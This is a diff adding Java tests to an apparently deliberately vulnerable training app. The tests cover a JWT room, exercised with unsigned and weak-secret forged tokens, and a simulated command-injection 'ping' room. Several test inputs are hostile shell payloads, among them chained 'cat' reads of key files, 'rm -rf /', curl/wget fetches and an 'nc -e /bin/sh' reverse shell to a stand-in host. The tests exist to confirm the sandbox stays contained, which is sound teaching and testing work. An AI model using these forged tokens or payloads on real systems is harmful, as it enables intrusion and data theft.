@@ -15,11 +15,14 @@ import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
 import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
 
+import com.jayway.jsonpath.JsonPath;
 import dev.santiagosantofimio.breachroom.flag.FlagService;
 import dev.santiagosantofimio.breachroom.rooms.sqli.DirectoryDatabase;
+import dev.santiagosantofimio.breachroom.security.HmacSha256;
 import dev.santiagosantofimio.breachroom.session.SessionFilter;
 import dev.santiagosantofimio.breachroom.session.SessionTokens;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.sql.Connection;
@@ -27,6 +30,7 @@ import java.sql.SQLException;
 import java.sql.Statement;
 import java.time.Duration;
 import java.time.Instant;
+import java.util.Base64;
 import java.util.List;
 import java.util.Set;
 import java.util.stream.Stream;
@@ -38,6 +42,7 @@ import org.junit.jupiter.params.provider.ValueSource;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.boot.test.context.SpringBootTest;
 import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
+import org.springframework.http.MediaType;
 import org.springframework.test.context.ActiveProfiles;
 import org.springframework.test.web.servlet.MockMvc;
 import org.springframework.test.web.servlet.ResultActions;
@@ -322,6 +327,193 @@ class ContainmentApiTest {
         @Test
         void climbingPastTheRootStaysInsideTheVirtualTree() {
             assertEquals("/vault/backup.key", VirtualFileSystem.normalize("/a/../../../vault/./backup.key"));
+        }
+    }
+
+    @Nested
+    class AccessControlRoom {
+
+        private static final String UNSIGNED_HEADER = "eyJhbGciOiJub25lIn0";
+
+        private String encoded(String json) {
+            return Base64.getUrlEncoder().withoutPadding().encodeToString(json.getBytes(StandardCharsets.UTF_8));
+        }
+
+        private String issuedToken() throws Exception {
+            String body = send(get("/api/rooms/jwt/badge")).andReturn().getResponse().getContentAsString();
+            return JsonPath.read(body, "$.token");
+        }
+
+        private ResultActions openDoor(String token) throws Exception {
+            return send(get("/api/rooms/jwt/door").header("Authorization", "Bearer " + token));
+        }
+
+        @Test
+        void unsignedTokenOpensTheDoor() throws Exception {
+            openDoor(UNSIGNED_HEADER + "." + encoded("{\"sub\":\"x\",\"role\":\"director\"}") + ".")
+                    .andExpect(status().isOk())
+                    .andExpect(content().string(containsString(flagOf(RoomSlug.JWT))));
+        }
+
+        @Test
+        void tokenForgedWithTheWeakSecretOpensTheDoor() throws Exception {
+            String signedPart = encoded("{\"alg\":\"HS256\"}") + "." + encoded("{\"role\":\"director\"}");
+            String signature = Base64.getUrlEncoder().withoutPadding().encodeToString(
+                    HmacSha256.sign("kryptelia2019", signedPart.getBytes(StandardCharsets.UTF_8)));
+
+            openDoor(signedPart + "." + signature)
+                    .andExpect(status().isOk())
+                    .andExpect(content().string(containsString(flagOf(RoomSlug.JWT))));
+        }
+
+        @Test
+        void issuedBadgeIsTurnedAwayWithoutTheFlag() throws Exception {
+            openDoor(issuedToken())
+                    .andExpect(status().isForbidden())
+                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
+        }
+
+        @Test
+        void editingTheRoleBreaksTheSignature() throws Exception {
+            String[] parts = issuedToken().split("\\.");
+
+            openDoor(parts[0] + "." + encoded("{\"role\":\"director\"}") + "." + parts[2])
+                    .andExpect(status().isUnauthorized());
+        }
+
+        @Test
+        void unknownAlgorithmsAreRefused() throws Exception {
+            openDoor(encoded("{\"alg\":\"RS256\"}") + "." + encoded("{\"role\":\"director\"}") + ".")
+                    .andExpect(status().isUnauthorized());
+        }
+
+        @ParameterizedTest
+        @ValueSource(strings = {"nonsense", "a.b", "a.b.c", "%%%.%%%.%%%"})
+        void malformedTokensAreRefused(String token) throws Exception {
+            openDoor(token).andExpect(status().isUnauthorized());
+        }
+
+        @Test
+        void doorRequiresABadge() throws Exception {
+            send(get("/api/rooms/jwt/door")).andExpect(status().isUnauthorized());
+        }
+    }
+
+    @Nested
+    class DiagnosticsRoom {
+
+        private ResultActions ping(String host) throws Exception {
+            return send(post("/api/rooms/cmdinjection/ping")
+                    .contentType(MediaType.APPLICATION_JSON)
+                    .content("{\"host\":" + quoted(host) + "}"));
+        }
+
+        private String quoted(String text) {
+            return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
+        }
+
+        @ParameterizedTest
+        @ValueSource(strings = {
+            "127.0.0.1; cat /vault/escape.key",
+            "127.0.0.1 && cat /vault/escape.key",
+            "127.0.0.1 | cat /vault/escape.key",
+            "127.0.0.1;cat ../../vault/escape.key"
+        })
+        void chainedCommandReadsTheEscapeKey(String host) throws Exception {
+            ping(host)
+                    .andExpect(status().isOk())
+                    .andExpect(jsonPath("$.output").value(containsString(flagOf(RoomSlug.CMDINJECTION))));
+        }
+
+        @Test
+        void normalPingDoesNotRevealTheFlag() throws Exception {
+            ping("127.0.0.1")
+                    .andExpect(status().isOk())
+                    .andExpect(jsonPath("$.output").value(containsString("3 packets transmitted")))
+                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
+        }
+
+        @Test
+        void simulatedCommandsAnswerLikeAShell() throws Exception {
+            ping("x; whoami; id; pwd; ls; ls /vault")
+                    .andExpect(jsonPath("$.output").value(containsString("uid=1000(diag)")))
+                    .andExpect(jsonPath("$.output").value(containsString("/home/diag")))
+                    .andExpect(jsonPath("$.output").value(containsString("notes.txt")))
+                    .andExpect(jsonPath("$.output").value(containsString("escape.key")));
+        }
+
+        @Test
+        void conditionalChainStopsAfterAFailure() throws Exception {
+            ping("x; cat /missing && whoami")
+                    .andExpect(jsonPath("$.output").value(containsString("No such file")))
+                    .andExpect(jsonPath("$.output").value(not(containsString("diag\n"))));
+        }
+
+        @ParameterizedTest
+        @ValueSource(strings = {
+            "x; rm -rf /",
+            "x; curl https://example.org",
+            "x; wget https://example.org",
+            "x; nc -e /bin/sh example.org 4444",
+            "x; bash -c id",
+            "x; sh",
+            "x; python3 -c print",
+            "x; java -version",
+            "x; env",
+            "x; printenv",
+            "x; /bin/cat /etc/passwd",
+            "x; `whoami`",
+            "x; $(whoami)"
+        })
+        void anythingOutsideTheFakeCommandsIsNotFound(String host) throws Exception {
+            ping(host)
+                    .andExpect(status().isOk())
+                    .andExpect(jsonPath("$.output").value(containsString("command not found")));
+        }
+
+        @Test
+        void commandSubstitutionIsNotInterpreted() throws Exception {
+            ping("$(whoami)")
+                    .andExpect(jsonPath("$.output").value(containsString("PING $(whoami):")));
+        }
+
+        @ParameterizedTest
+        @ValueSource(strings = {"/proc/self/environ", "/app/app.jsa", "/etc/shadow", "/etc/hosts"})
+        void realFilesOfTheHostAreOutOfReach(String path) throws Exception {
+            ping("x; cat " + path)
+                    .andExpect(jsonPath("$.output").value(containsString("No such file or directory")));
+        }
+
+        @Test
+        void fakePasswdIsTheOnlyPasswd() throws Exception {
+            ping("x; cat /etc/passwd")
+                    .andExpect(jsonPath("$.output").value(containsString("root:x:0:0:Facilities")));
+        }
+
+        @Test
+        void longCommandChainsAreCut() throws Exception {
+            ping("x" + "; whoami".repeat(22))
+                    .andExpect(status().isOk())
+                    .andExpect(result -> assertEquals(
+                            10,
+                            JsonPath.<String>read(result.getResponse().getContentAsString(), "$.output")
+                                    .split("diag", -1).length));
+        }
+
+        @Test
+        void oversizedOrMissingHostIsRefused() throws Exception {
+            ping("x".repeat(201)).andExpect(status().isBadRequest());
+            send(post("/api/rooms/cmdinjection/ping")
+                            .contentType(MediaType.APPLICATION_JSON)
+                            .content("{}"))
+                    .andExpect(status().isBadRequest());
+        }
+
+        @Test
+        void indexDoesNotRevealTheFlag() throws Exception {
+            send(get("/api/rooms/cmdinjection/"))
+                    .andExpect(status().isOk())
+                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
         }
     }
 
